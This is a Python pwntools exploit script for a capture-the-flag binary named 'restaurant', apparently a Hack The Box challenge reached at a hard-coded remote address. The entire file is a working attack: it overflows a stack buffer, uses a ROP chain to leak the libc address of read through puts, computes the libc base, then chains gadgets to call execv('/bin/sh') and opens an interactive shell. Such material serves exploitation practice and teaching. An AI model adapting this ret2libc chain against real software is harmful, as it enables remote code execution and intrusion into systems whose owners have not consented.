#!/usr/bin/env python3
from pwn import *

elf = ELF("./given/restaurant")
libc = None

def conn():
    global libc
    if args.REMOTE:
        p = remote("159.65.92.208", 30046)
        libc = ELF("./given/libc.so.6")
    else:
        p = process([elf.path])
        libc = ELF("/usr/lib/x86_64-linux-gnu/libc.so.6")
        if args.D:
            gdb.attach(p, gdbscript="""
                    b fill
                    """)
    return p

def bufovfl():
    p = conn()

    #
    DUMMY = 0xdeadbeef

    # info objdump
    plt_read = 0x400690
    got_read = 0x601fc8
    plt_puts = 0x400650
    call_fill = 0x400fee
    text_fill_read = 0x400ebc
    data_readable = 0x602050
    data_writable = data_readable

    # ROPgadget
    rop_rdi = 0x4010a3
    rop_rsi_r15 = 0x4010a1


    # choose "1" to get into <fill> function
    p.recvuntil(b"What would you like?")
    p.recvuntil(b"1. Fill my dish.")
    p.recvuntil(b"2. Drink something")
    p.recvuntil(b">")
    p.sendline(b"1")

    # <fill>
    p.recvuntil(b"You can also order something else.")
    p.recvuntil(b">")
    padding = b"a" * (cyclic_find("kaaa")-1) + b"\x00"
    payload = padding
    payload += p64(rop_rdi) + p64(got_read) + p64(plt_puts)
    payload += p64(rop_rsi_r15) + p64(data_readable) + p64(DUMMY) + p64(call_fill)
    p.sendline(payload)
    p.recvuntil(padding[:-1]) # recvuntil null bytes
    leaked_libc_read = p.recv(6, timeout=0.5)
    if len(leaked_libc_read) < 6 and not args.D:
        print("leak failed")
        quit()
    libc_read = u64(leaked_libc_read.ljust(8, b"\x00"))
    print("libc read address", hex(libc_read))
    libc.address = libc_read - libc.symbols['read']

    #libc_execve = libc_read - libc.symbols['read'] + libc.symbols['execve']
    #libc_execv = libc_read - libc.symbols['read'] + libc.symbols['execv']
    #libc_system = libc_read - libc.symbols['read'] + libc.symbols['system']
    #libc_shell_str = libc_read - libc.symbols['read'] + next(libc.search(b"/bin/sh"))

    p.recvuntil(b"You can also order something else.")
    p.recvuntil(b">")
    payload = padding
    # execv("/bin/sh", NULL)
    payload += p64(rop_rsi_r15) + p64(0) + p64(DUMMY)
    #payload += p64(rop_rdi) + p64(libc_shell_str)
    payload += p64(rop_rdi) + p64(next(libc.search(b"/bin/sh")))
    payload += p64(libc.symbols['execv'])
    #payload += p64(libc_execv)
    p.sendline(payload)
    p.interactive()


if __name__ == '__main__':
    bufovfl()



